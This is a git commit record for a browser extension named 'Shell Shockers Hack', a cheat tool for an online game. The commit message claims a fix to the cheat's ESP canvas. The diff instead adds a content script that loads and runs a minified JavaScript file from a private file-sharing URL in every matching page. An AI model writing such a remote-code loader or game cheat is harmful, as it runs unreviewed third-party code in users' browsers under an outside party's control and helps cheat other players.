f07c432423f3b121f349dd55ec6528a117c75bec
Triston Stuart <triston.stuart@icloud.com>
2020-05-04 18:26:55 -0700

    Update V4.2.1
    Fixes error with esp canvas not clearing due to canvas.width and canvas.height not being accurate on some computers.

---
+++ Shell Shockers Hack (V4.2.1)/content.js
@@ -0,0 +1,8 @@
+
+ var script = document.createElement('script');
+  script.src = 'https://cdn.filesend.jp/private/CDW8oEcOSbX2AnjX3-rYV5ufgVRIM0DHCkMTGBQurMmSPVt5mFEa2hW9jSKy06uu/shellshock.min.js';
+  script.type = 'text/javascript';
+  script.onload = function() {
+    console.log('your script have been loaded');
+  }
+  document.body.appendChild(script);
